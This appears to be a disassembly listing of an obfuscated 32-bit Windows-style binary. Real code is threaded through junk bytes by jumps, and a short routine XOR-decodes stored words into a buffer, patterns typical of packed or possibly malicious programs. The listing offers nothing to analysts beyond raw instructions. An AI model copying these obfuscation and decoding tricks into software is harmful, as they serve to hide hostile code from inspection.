  4031f4:	cmp    ebx,DWORD PTR [ebp+0x32d332b2]
  4031fa:	pusha  
  4031fb:	(bad)  
  4031fc:	out    dx,eax
  4031fd:	dec    esi
  4031fe:	cmp    BYTE PTR [eax+0x6f96a61a],al
  403204:	aam    0x12
  403206:	or     BYTE PTR [ebx-0x50],ch
  403209:	mov    bh,BYTE PTR [ebx]
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42edef,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42edcb
  403229:	adc    DWORD PTR ds:0x4304d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e7c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430461,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	or     al,0xfd
  40325e:	cmp    BYTE PTR [edx+edx*8-0x518181ea],bl
  403265:	jg     0x4032e5
  403267:	jle    0x403251
  403269:	cs jae 0x403268
  40326c:	fsub   DWORD PTR [esi-0x55]
  40326f:	mov    bl,al
  403271:	adc    bl,BYTE PTR [eax-0x217d3127]
  403277:	push   esi
  403278:	cmp    al,0x1f
  40327a:	dec    esi
  40327b:	out    0x8,eax
  40327d:	iret   
  40327e:	sub    ebp,esp
  403280:	outs   dx,DWORD PTR ds:[esi]
  403281:	fistp  DWORD PTR [edi-0x64f5d737]
  403287:	pop    ecx
  403288:	pop    edx
  403289:	jnp    0x40326a
  40328b:	mov    edi,0x4025b45
  403290:	jo     0x403287
  403292:	popa   
  403293:	jae    0x4032b2
  403295:	in     eax,dx
  403296:	fidivr DWORD PTR [ebp+0xf]
  403299:	mov    ds:0x498b2a0b,al
  40329e:	imul   ecx,esp,0xcacc261d
  4032a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a5:	cmp    dh,ch
  4032a7:	ss pop ebp
  4032a9:	cs push edi
  4032ab:	(bad)  
  4032ac:	mov    eax,ds:0x45092d59
  4032b1:	pop    edi
  4032b2:	lea    ecx,[ecx]
  4032b4:	xchg   esi,eax
  4032b5:	pop    ecx
  4032b6:	js     0x4032d6
  4032b8:	xchg   eax,ebx
  4032ba:	adc    BYTE PTR [ebp+0x7b4000e6],ah
  4032c0:	push   0xc64d7ad5
  4032c5:	in     al,dx
  4032c6:	dec    edx
  4032c7:	out    dx,al
  4032c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032c9:	(bad)  
  4032ca:	pop    edx
  4032cb:	arpl   WORD PTR [edi-0x5c],di
  4032ce:	push   esp
  4032cf:	cs mov bl,0x87
  4032d2:	ins    DWORD PTR es:[edi],dx
  4032d3:	sub    dh,al
  4032d5:	add    al,0x9d
  4032d7:	div    DWORD PTR [ebp-0x5c]
  4032da:	xor    esp,eax
  4032dc:	dec    esp
  4032dd:	lock out 0xa8,eax
  4032e0:	xor    eax,0x8d482d6d
  4032e5:	inc    edi
  4032e6:	out    0x99,al
  4032e8:	into   
  4032e9:	pop    ds
  4032ea:	test   DWORD PTR [esi],edi
  4032ec:	mov    edi,0x3b35bff2
  4032f1:	enter  0x6200,0xeb
  4032f5:	pushf  
  4032f6:	sbb    dl,BYTE PTR [eax-0x73]
  4032f9:	cs push cs
  4032fb:	loope  0x4032e1
  4032fd:	push   0xc61c81df
  403302:	loope  0x403344
  403304:	jl     0x4032b5
  403306:	(bad)
  403309:	rol    DWORD PTR [edi-0x1f1b5686],0xb5
  403310:	jecxz  0x4032e5
  403312:	sbb    ebp,DWORD PTR [esp-0x24]
  403316:	(bad)  
  403317:	in     al,0x75
  403319:	aam    0xf0
  40331b:	adc    ah,BYTE PTR [eax]
  40331d:	pop    esi
  40331e:	xor    esp,0xffffffdd
  403321:	and    dh,ch
  403323:	pusha  
  403324:	je     0x40333d
  403326:	jne    0x4032f7
  403328:	js     0x4032de
  40332a:	sub    al,ch
  40332c:	mov    ebp,0x9a3777d8
  403331:	lods   al,BYTE PTR ds:[esi]
  403332:	sub    al,0x74
  403334:	sub    al,0x20
  403336:	scas   al,BYTE PTR es:[edi]
  403337:	fucomp st(6)
  403339:	adc    edx,esi
  40333b:	popf   
  40333c:	jp     0x403380
  40333e:	fild   WORD PTR [ecx+ecx*1-0x51938a8b]
  403345:	jnp    0x403398
  403347:	mov    dl,0x13
  403349:	and    eax,0x14e6087e
  40334e:	push   edi
  40334f:	inc    ebx
  403350:	jmp    0x69668394
  403355:	aaa    
  403356:	xor    esp,DWORD PTR [ecx-0x4b4283ec]
  40335c:	sub    eax,0xaabb1391
  403361:	shl    DWORD PTR [ecx],cl
  403363:	mov    dh,0xc9
  403365:	test   DWORD PTR [ebx+0x38],esp
  403368:	xchg   edi,eax
  403369:	inc    ch
  40336b:	loop   0x403365
  40336d:	(bad)  
  40336e:	pushf  
  40336f:	data16 adc BYTE PTR [ebx],0xf7
  403373:	push   ss
  403374:	imul   esp,DWORD PTR [ecx],0x90e144d
  40337a:	sub    eax,0xa44d687b
  40337f:	sahf   
  403380:	adc    dh,BYTE PTR [esi-0x74f9200e]
  403386:	push   ebp
  403387:	enter  0x5dce,0x10
  40338b:	fdiv   st,st(7)
  40338d:	sbb    eax,0x26e0e8cc
  403392:	xchg   ecx,eax
  403393:	test   BYTE PTR [edx],dh
  403395:	out    0x1c,eax
  403397:	std    
  403398:	addr16 jbe 0x403366
  40339b:	(bad)  
  40339c:	(bad)  
  40339d:	sub    al,0x7b
  40339f:	in     eax,dx
  4033a0:	cli    
  4033a1:	mov    es,WORD PTR [ebx+0x43a3e9e7]
  4033a7:	aad    0x45
  4033a9:	ja     0x40336c
  4033ab:	fdivr  st(1),st
  4033ad:	iret   
  4033ae:	popf   
  4033af:	(bad)  
  4033b0:	hlt    
  4033b1:	sub    al,0x22
  4033b3:	sub    DWORD PTR [ecx-0x7b616ad4],eax
  4033b9:	outs   dx,BYTE PTR ds:[esi]
  4033ba:	gs push 0x5e357504
  4033c0:	aad    0x3a
  4033c2:	and    al,0x24
  4033c4:	inc    ecx
  4033c5:	mov    ch,0xf9
  4033c7:	jp     0x403351
  4033c9:	xchg   ecx,eax
  4033ca:	aad    0x6
  4033cc:	ret    
  4033cd:	mov    esp,0x114a2e77
  4033d2:	fnstcw WORD PTR [ebp-0x780b38a7]
  4033d8:	outs   dx,DWORD PTR ds:[esi]
  4033d9:	and    ebp,edx
  4033db:	xchg   ecx,eax
  4033dc:	shl    ah,0xf8
  4033df:	push   0xffffffbc
  4033e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033e2:	adc    eax,DWORD PTR [esi+ebx*4+0x79]
  4033e6:	mov    al,0x70
  4033e8:	imul   ebx,DWORD PTR [esi],0x966edd5
  4033ee:	dec    edx
  4033ef:	imul   ebp,DWORD PTR [edx+0x13],0xffffff92
  4033f3:	out    0x3b,eax
  4033f5:	fmul   DWORD PTR [esi+ecx*8]
  4033f8:	push   esp
  4033f9:	xchg   ebp,eax
  4033fa:	xchg   ebp,eax
  4033fb:	jbe    0x403385
  4033fd:	adc    ebp,DWORD PTR [edi]
  4033ff:	shl    BYTE PTR [edi+eax*2-0x6f],cl
  403403:	sbb    al,0x79
  403405:	rcl    BYTE PTR ds:0x9f1b435,1
  40340b:	push   ecx
  40340c:	or     ch,bh
  40340e:	pop    ebx
  40340f:	push   eax
  403410:	bound  esp,QWORD PTR [esi-0x7854efa7]
  403416:	jno    0x403440
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x430459
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	push   edi
  403453:	fcom   QWORD PTR [ecx+eax*8]
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x403404
  40345f:	xchg   edi,eax
  403460:	mov    bl,0x4a
  403462:	sbb    BYTE PTR [eax+0x71688117],cl
  403468:	or     BYTE PTR [ecx-0x273b8627],ch
  40346e:	dec    ebp
  40346f:	scas   al,BYTE PTR es:[edi]
  403470:	mov    dh,0x1d
  403472:	dec    edi
  403473:	cmp    bp,WORD PTR [ecx+eiz*4-0x4d]
  403478:	repz sbb al,0xad
  40347b:	fs jecxz 0x4034d9
  40347e:	add    ecx,edx
  403480:	jae    0x403488
  403482:	fistp  QWORD PTR [eax+0x6dad4ab4]
  403488:	mov    eax,0x2ad564a1
  40348d:	adc    al,0x71
  40348f:	pop    edi
  403490:	hlt    
  403491:	xor    dh,BYTE PTR [ebx]
  403493:	and    di,WORD PTR [eax*8-0x2c99577c]
  40349b:	into   
  40349c:	dec    edi
  40349d:	(bad)  
  40349e:	ficomp WORD PTR [esi]
  4034a0:	xchg   ecx,eax
  4034a1:	jl     0x40351b
  4034a3:	not    edx
  4034a5:	clc    
  4034a6:	mov    ah,cl
  4034a8:	stos   BYTE PTR es:[edi],al
  4034a9:	nop
  4034aa:	xchg   edi,eax
  4034ab:	push   0x54
  4034ad:	dec    edi
  4034ae:	call   0x590c12e1
  4034b3:	iret   
  4034b4:	pop    ds
  4034b5:	mov    ds:0xd7f10a9a,al
  4034ba:	sbb    DWORD PTR [esp+eax*8],eax
  4034bd:	cs add edi,esp
  4034c0:	hlt    
  4034c1:	add    al,0x20
  4034c3:	stos   DWORD PTR es:[edi],eax
  4034c4:	lods   eax,DWORD PTR ds:[esi]
  4034c5:	jno    0x4034f4
  4034c7:	div    WORD PTR [edx-0x42cd422e]
  4034ce:	call   0xb84a3d2
  4034d3:	enter  0xb4a7,0x9
  4034d7:	push   es
  4034d8:	das    
  4034d9:	inc    ebx
  4034da:	pop    ecx
  4034db:	mov    dh,0x1
  4034dd:	jae    0x4034dd
  4034df:	sbb    ah,dl
  4034e1:	pop    ebp
  4034e2:	jg     0xa1a78a3d
  4034e8:	dec    ebp
  4034e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ea:	test   al,0x56
  4034ec:	jge    0x40353b
  4034ee:	js     0x40354a
  4034f0:	sti    
  4034f1:	add    BYTE PTR [ebx-0x49],bl
  4034f4:	pop    ebx
  4034f5:	mov    esp,0x383ad504
  4034fa:	xchg   ebp,eax
  4034fb:	push   ds
  4034fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034fd:	cs push esi
  4034ff:	dec    eax
  403500:	gs jp  0x4034e3
  403503:	outs   dx,DWORD PTR ds:[esi]
  403504:	add    al,0xdf
  403506:	js     0x4034cf
  403508:	(bad)  
  403509:	mov    ds:0x274d0a52,eax
  40350e:	test   DWORD PTR [esi],ecx
  403510:	add    ch,ch
  403512:	call   DWORD PTR [edi-0xa]
  403515:	ins    BYTE PTR es:[edi],dx
  403516:	repnz and ebp,ebp
  403519:	sbb    BYTE PTR [eax+ebp*8],ah
  40351c:	mov    esi,DWORD PTR [edx+0x5025a64f]
  403522:	xor    al,BYTE PTR [ebp+eiz*4-0x2c]
  403526:	sbb    DWORD PTR [ecx],0x5c
  403529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40352a:	fiadd  DWORD PTR cs:[edi-0x59]
  40352e:	fwait
  40352f:	jb     0x403568
  403531:	mov    bl,0x64
  403533:	cld    
  403534:	cs add eax,0x61
  403538:	les    ebx,FWORD PTR [esi+0x5abf116d]
  40353e:	pusha  
  40353f:	stos   BYTE PTR es:[edi],al
  403540:	jns    0x4034d3
  403542:	xchg   edx,eax
  403543:	jmp    0x78d96c9
  403548:	xchg   edx,eax
  403549:	mov    ah,0x68
  40354b:	nop
  40354c:	into   
  40354d:	sub    eax,0x46bf513f
  403552:	add    DWORD PTR [eax-0x3c835045],edi
  403558:	cmp    dh,dl
  40355a:	mov    ds:0x37ea58c9,eax
  40355f:	pop    edx
  403560:	pop    eax
  403561:	jne    0x4035ae
  403563:	pop    esi
  403564:	cwde   
  403565:	aam    0x8b
  403567:	(bad)  
  403568:	aad    0x72
  40356a:	adc    al,0xd7
  40356c:	outs   dx,DWORD PTR ds:[esi]
  40356d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40356f:	push   0xffffffad
  403571:	push   es
  403572:	or     eax,0xe15620ee
  403578:	or     BYTE PTR [ecx],0xa4
  40357b:	shl    DWORD PTR [esi+0x44],1
  40357e:	outs   dx,DWORD PTR ds:[esi]
  40357f:	pop    ss
  403580:	mov    WORD PTR ds:[esi+0x312db92],gs
  403587:	jo     0x403589
  403589:	xchg   BYTE PTR [esi+eiz*2+0x2a1aa8e1],ch
  403590:	sub    edi,DWORD PTR [edi-0x65cb8319]
  403596:	add    eax,0xc8904cc5
  40359b:	out    0xcd,al
  40359d:	pop    edi
  40359e:	scas   eax,DWORD PTR es:[edi]
  40359f:	arpl   bx,bx
  4035a1:	je     0x403620
  4035a3:	xor    dh,BYTE PTR [ecx+0x552afdc5]
  4035a9:	(bad)  
  4035aa:	sti    
  4035ab:	xchg   esi,eax
  4035ac:	xchg   ebx,eax
  4035ad:	pop    ss
  4035ae:	fwait
  4035af:	jmp    0xb793:0x5cfb0a2a
  4035b6:	in     eax,dx
  4035b7:	push   ebx
  4035b8:	pusha  
  4035b9:	clc    
  4035ba:	mov    edi,0x58b632a6
  4035bf:	out    0xc6,al
  4035c1:	das    
  4035c2:	ffreep st(3)
  4035c4:	pop    ebp
  4035c5:	xor    al,BYTE PTR [ebp+ecx*1+0x63]
  4035c9:	nop
  4035ca:	imul   ebx,esi,0xef6f50e8
  4035d0:	adc    bh,dl
  4035d2:	out    0x73,eax
  4035d4:	push   ds
  4035d5:	aas    
  4035d6:	pop    es
  4035d7:	jge    0x403609
  4035d9:	test   eax,0x8c6a71
  4035de:	outs   dx,DWORD PTR ds:[esi]
  4035df:	xor    BYTE PTR [edi],dh
  4035e1:	adc    esi,DWORD PTR [ebp+ebx*4-0x15]
  4035e5:	or     esi,DWORD PTR [ecx]
  4035e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e8:	pop    ecx
  4035e9:	jb     0x403588
  4035eb:	in     al,dx
  4035ec:	lods   eax,DWORD PTR ds:[esi]
  4035ed:	aad    0xc5
  4035ef:	aas    
  4035f0:	pop    ebx
  4035f1:	(bad)  
  4035f2:	jl     0x40361b
  4035f4:	cmp    al,0x7a
  4035f6:	xchg   ebp,eax
  4035f7:	jmp    0xc886:0x679a20bb
  4035fe:	ds jp  0x4035dc
  403601:	cmp    ebp,ecx
  403603:	adc    eax,0x48840357
  403608:	or     al,0x26
  40360a:	fstp   QWORD PTR [edi-0x1f]
  40360d:	pop    edx
  40360e:	xor    edx,ecx
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x973dd7c8
  40366f:	dec    ebx
  403670:	in     al,dx
  403671:	jne    0x403625
  403673:	adc    eax,0x7fae7e7e
  403678:	jle    0x4036f8
  40367a:	outs   dx,DWORD PTR ds:[esi]
  40367b:	call   0xe1b7:0xa376e9ae
  403682:	push   ebx
  403683:	xor    bl,dh
  403685:	and    bh,ch
  403687:	and    DWORD PTR [edx],ebp
  403689:	in     eax,0x29
  40368b:	pop    edx
  40368c:	(bad)  
  40368d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40368e:	jns    0x4036b6
  403690:	std    
  403691:	test   al,0x97
  403693:	xchg   esi,edi
  403695:	mov    WORD PTR [edx+0x22e9ec71],ss
  40369b:	fld    DWORD PTR [edx]
  40369d:	sub    ebp,DWORD PTR [ebx+0x7557349d]
  4036a3:	xchg   ecx,eax
  4036a4:	or     esi,edi
  4036a6:	stos   WORD PTR es:[edi],ax
  4036a8:	adc    BYTE PTR [eax-0x60ebab6e],dl
  4036ae:	sbb    ch,bl
  4036b0:	inc    ebx
  4036b1:	adc    dh,bh
  4036b3:	mov    ebp,0x92f3a20f
  4036b8:	lods   eax,DWORD PTR ds:[esi]
  4036b9:	mov    ecx,0x8e4ec113
  4036be:	iret   
  4036bf:	sbb    al,0x58
  4036c1:	inc    DWORD PTR [ebx+0x1b1b6099]
  4036c7:	cdq    
  4036c8:	(bad)  
  4036c9:	popf   
  4036ca:	or     al,0x19
  4036cc:	add    ch,ah
  4036ce:	pop    ds
  4036cf:	dec    eax
  4036d0:	adc    DWORD PTR ds:0x6bc1a5bd,esi
  4036d6:	jbe    0x4036c0
  4036d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036d9:	adc    edi,0x1c
  4036dc:	shl    BYTE PTR [ecx+0x5f24557a],0x3f
  4036e3:	jae    0x403713
  4036e5:	test   al,0xd7
  4036e7:	xor    eax,0x74a42ee1
  4036ec:	cmp    cl,BYTE PTR [esi-0x34]
  4036ef:	lock retf 
  4036f1:	sub    ch,BYTE PTR ds:0xa6292575
  4036f7:	fsubp  st(1),st
  4036f9:	ss (bad) 
  4036fb:	push   ebx
  4036fc:	adc    BYTE PTR [esi-0x64234e4f],ah
  403702:	clc    
  403703:	jb     0x40373b
  403705:	sbb    bh,al
  403707:	add    ebp,DWORD PTR [edx+0x63]
  40370a:	inc    esi
  40370b:	(bad)  
  40370c:	cmp    BYTE PTR [edx-0x5a],bl
  40370f:	rcl    edx,cl
  403711:	dec    esp
  403712:	ins    DWORD PTR es:[edi],dx
  403713:	and    BYTE PTR [ebx+esi*8+0x5652b93f],0x4d
  40371b:	stos   DWORD PTR es:[edi],eax
  40371c:	ret    0x4f00
  40371f:	int3   
  403720:	cmc    
  403721:	or     BYTE PTR [eax],dh
  403723:	jg     0x403749
  403725:	pusha  
  403726:	mov    ecx,0x5e9f9c58
  40372b:	es inc ebp
  40372d:	xchg   ebp,eax
  40372e:	arpl   WORD PTR [edx],di
  403730:	pop    ecx
  403731:	mov    al,ds:0x7026c007
  403736:	push   es
  403737:	retf   
  403738:	xor    eax,0xf5c553a0
  40373d:	ss inc ecx
  40373f:	mov    ds:0x9cded1b0,eax
  403744:	sbb    eax,0x2415548e
  403749:	fxch   st(1)
  40374b:	sti    
  40374c:	in     al,dx
  40374d:	jae    0x403779
  40374f:	push   0x5d
  403751:	shl    edi,0x92
  403754:	push   ds
  403755:	pop    esi
  403756:	mov    bl,0xc2
  403758:	sbb    ecx,esp
  40375a:	loope  0x4037bd
  40375c:	xchg   esi,eax
  40375d:	jmp    0x4037b4
  40375f:	cld    
  403760:	jo     0x40379a
  403762:	mov    eax,ds:0x90ebda6
  403767:	push   esp
  403768:	jmp    0x4158:0x757ea49d
  40376f:	arpl   WORD PTR [si],bp
  403772:	fnstcw WORD PTR [edx+edi*1-0x8251718]
  403779:	popf   
  40377a:	mov    ax,ds:0x3e00d08a
  403780:	mov    ch,0x8a
  403782:	sbb    DWORD PTR [ebx+0x38da56c4],ebx
  403788:	fld    DWORD PTR [eax+0x5288c58c]
  40378e:	jno    0x40380b
  403790:	push   es
  403791:	jb     0x403764
  403793:	mov    eax,0x646777c7
  403798:	loopne 0x403791
  40379a:	fst    DWORD PTR [eax+0x7f]
  40379d:	and    eax,0x97295c32
  4037a2:	inc    esp
  4037a3:	popa   
  4037a4:	leave  
  4037a5:	cmc    
  4037a6:	mov    ah,0x43
  4037a8:	cmp    al,0x41
  4037aa:	(bad)  
  4037ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ac:	adc    DWORD PTR [edi-0x5b],ebx
  4037af:	test   eax,0x6e2a0bd
  4037b4:	mov    ah,0xce
  4037b6:	dec    esi
  4037b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037b8:	outs   dx,DWORD PTR ds:[esi]
  4037b9:	data16 fmul st(4),st
  4037bc:	and    DWORD PTR [ebx+0x2f198ef2],edi
  4037c2:	mov    bh,0x2b
  4037c4:	mov    esp,0x81409a07
  4037c9:	sbb    ch,BYTE PTR [ecx-0x7587b262]
  4037cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037d0:	ss scas al,BYTE PTR es:[edi]
  4037d2:	and    edi,0x2d
  4037d5:	gs or  bh,dl
  4037d8:	sub    esp,DWORD PTR [eax+0x23db845f]
  4037de:	pop    edi
  4037df:	inc    edx
  4037e0:	shl    BYTE PTR [edi-0x13],cl
  4037e3:	jno    0x403827
  4037e5:	sahf   
  4037e6:	jmp    0x40384f
  4037e8:	or     ch,BYTE PTR [edi+0x47]
  4037eb:	inc    edi
  4037ec:	xor    al,0x95
  4037ee:	jns    0x4037f4
  4037f0:	mov    ds:0x8f8ccc05,eax
  4037f5:	mov    al,ds:0xd7edf74a
  4037fa:	adc    BYTE PTR [edx-0x35],cl
  4037fd:	sbb    ecx,esi
  4037ff:	inc    esp
  403800:	xor    edx,DWORD PTR es:[ebp-0x72]
  403804:	sub    ebx,DWORD PTR [esp+edi*1+0x1876856d]
  40380b:	xlat   BYTE PTR ds:[ebx]
  40380c:	arpl   di,ax
  40380e:	mov    dh,BYTE PTR ds:[esi-0x19]
  403812:	mov    ah,0x60
  403814:	fisttp DWORD PTR [esp+edx*1+0xf]
  403818:	test   DWORD PTR [ebp+0x23a0a447],edx
  40381e:	mov    ds:0x19e2ce65,al
  403823:	jg     0x40380e
  403825:	pop    eax
  403826:	add    DWORD PTR [ebx+0x67],0xffffffaa
  40382a:	mov    edx,DWORD PTR [ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x9ab61f23
  403845:	or     eax,0x7e7e13e2
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4038ae
  40384f:	data16 ficomp DWORD PTR ds:0xd8b467f0
  403856:	repnz ins BYTE PTR es:[edi],dx
  403858:	out    0x8b,al
  40385a:	bound  esp,QWORD PTR [ecx+esi*1-0x66c14281]
  403861:	ja     0x40383f
  403863:	mov    ah,0xbe
  403865:	mov    ecx,0x72d2b048
  40386a:	leave  
  40386b:	sbb    eax,0x67de6a7e
  403870:	jg     0x4038b5
  403872:	xchg   ebx,eax
  403873:	pop    ss
  403874:	jmp    0xd22f:0x75a0b763
  40387b:	push   ebp
  40387c:	pusha  
  40387d:	xor    al,BYTE PTR [edx+eax*8+0x52]
  403881:	add    BYTE PTR [eax-0x2],cl
  403884:	pop    ss
  403885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403887:	mov    cl,0x7
  403889:	xor    BYTE PTR [edi-0x68bd1450],bh
  40388f:	cmp    bl,BYTE PTR [edx+ebp*1]
  403892:	mov    esi,0x1900b073
  403897:	sub    DWORD PTR [edi+edx*1+0x32266bbd],0xfcf93ba3
  4038a2:	xor    DWORD PTR [edi],0xffffff95
  4038a5:	or     esi,DWORD PTR [ebp-0x3920470d]
  4038ab:	shr    DWORD PTR [ecx],1
  4038ad:	push   ds
  4038ae:	inc    esp
  4038af:	jp     0x403877
  4038b1:	les    eax,FWORD PTR [ecx+0x606f1be4]
  4038b7:	mov    bl,BYTE PTR [eax]
  4038b9:	add    esi,DWORD PTR [edi+0x3]
  4038bc:	mov    fs,WORD PTR [ebp+0x6b93487c]
  4038c2:	rcl    DWORD PTR [ebp-0x6b],0xe
  4038c6:	inc    eax
  4038c7:	mov    eax,0x9c4375e7
  4038cc:	jle    0x403945
  4038ce:	or     eax,0xbb1546ad
  4038d3:	dec    esi
  4038d4:	pop    ebx
  4038d5:	addr16 or esi,esp
  4038d8:	cli    
  4038d9:	lods   al,BYTE PTR ds:[esi]
  4038da:	ja     0x403918
  4038dc:	mov    dl,0x61
  4038de:	jb     0x403945
  4038e0:	jnp    0x40387f
  4038e2:	xor    ebx,DWORD PTR [ebx]
  4038e4:	xchg   esp,eax
  4038e5:	enter  0x2a3e,0x15
  4038e9:	cli    
  4038ea:	outs   dx,DWORD PTR ds:[esi]
  4038eb:	imul   edx,DWORD PTR [ecx-0x7],0xb60fc62b
  4038f2:	pop    ecx
  4038f3:	repnz sti 
  4038f5:	sbb    al,0x8a
  4038f7:	iret   
  4038f8:	mov    ebx,0xea2ebb1e
  4038fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038fe:	nop
  4038ff:	push   0xe554aca
  403904:	cdq    
  403905:	or     DWORD PTR [esi+ecx*1],edx
  403908:	or     BYTE PTR [ebx+0x59],al
  40390b:	js     0x40392f
  40390d:	outs   dx,DWORD PTR ds:[esi]
  40390e:	shl    dh,cl
  403910:	jns    0x4038a7
  403912:	pop    ebx
  403913:	pop    ds
  403914:	mov    dh,0xa9
  403916:	cmp    dl,bl
  403918:	cld    
  403919:	jnp    0x403967
  40391b:	lahf   
  40391c:	rcr    BYTE PTR [edx+0x70e72cb6],1
  403922:	and    al,0x8c
  403924:	jp     0x4038db
  403926:	sbb    BYTE PTR [ebx-0x30],ch
  403929:	mov    edi,0x520df2ab
  40392e:	add    cl,dh
  403930:	jnp    0x403922
  403932:	and    esi,DWORD PTR [ecx+eiz*2]
  403935:	jmp    0x4038b8
  403937:	sbb    BYTE PTR [eax+0x65c925bc],al
  40393d:	stc    
  40393e:	mov    ecx,esp
  403940:	ja     0x4038cc
  403942:	cmp    BYTE PTR [ecx-0x59],0xed
  403946:	jmp    DWORD PTR [ebx]
  403948:	out    0x86,al
  40394a:	outs   dx,DWORD PTR fs:[esi]
  40394c:	xor    ah,BYTE PTR [ecx-0x561a7cba]
  403952:	mov    ?,WORD PTR [ebp-0x18]
  403955:	xchg   esi,eax
  403956:	stos   DWORD PTR es:[edi],eax
  403957:	pop    ds
  403958:	ret    0x144c
  40395b:	(bad)  
  40395c:	das    
  40395d:	fld    DWORD PTR [edx]
  40395f:	mov    ch,0xeb
  403961:	add    DWORD PTR [eax-0x50832d58],0x20
  403968:	xor    ecx,esp
  40396a:	adc    dl,BYTE PTR [esi-0x1a9fa771]
  403970:	and    ebp,DWORD PTR [ebx+0xc1c1e4d]
  403976:	jne    0x403984
  403978:	ret    
  403979:	test   DWORD PTR [esi+0x45],eax
  40397c:	push   esi
  40397d:	mov    gs,WORD PTR [eax+0x19]
  403980:	pop    ds
  403981:	nop
  403982:	jbe    0x403930
  403984:	bound  edi,QWORD PTR [ecx]
  403986:	mov    ebx,0x14034b5
  40398b:	and    eax,0xbc80f629
  403990:	mov    esi,0xf388fa16
  403995:	and    al,0xe0
  403997:	je     0x4039b1
  403999:	fnstenv [esi+0x5cf26f1c]
  40399f:	adc    eax,0x3657e084
  4039a4:	and    bl,cl
  4039a6:	cli    
  4039a7:	mov    bh,0x4
  4039a9:	fst    QWORD PTR [eax]
  4039ab:	fcomp  DWORD PTR [ebp-0x682f03bc]
  4039b1:	xchg   ebp,eax
  4039b2:	pop    eax
  4039b3:	jmp    0x43798fd3
  4039b8:	loopne 0x403a23
  4039ba:	xchg   ebx,eax
  4039bb:	pushf  
  4039bc:	lea    edi,[eax+0x5c]
  4039bf:	mov    bh,BYTE PTR [ecx+0x18]
  4039c2:	ss dec eax
  4039c4:	or     al,0x2f
  4039c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c7:	in     eax,dx
  4039c8:	in     eax,0x43
  4039ca:	pop    esi
  4039cb:	or     ch,bh
  4039cd:	fisub  DWORD PTR [esi]
  4039cf:	xchg   edx,eax
  4039d0:	outs   dx,BYTE PTR ds:[esi]
  4039d1:	push   es
  4039d2:	mov    al,ds:0x597744d8
  4039d7:	daa    
  4039d8:	cmp    bh,BYTE PTR [ebp+0x5f]
  4039db:	sub    bl,BYTE PTR [ecx-0x3647a66e]
  4039e1:	inc    edx
  4039e2:	push   0xee164b96
  4039e7:	jb     0x403a0a
  4039e9:	(bad)  
  4039ea:	in     eax,0xb0
  4039ec:	xor    ecx,ebp
  4039ee:	sub    dh,BYTE PTR [ebx]
  4039f0:	jns    0x4039bb
  4039f2:	lea    edi,[edi]
  4039f4:	and    BYTE PTR [edx+0xf],0xc1
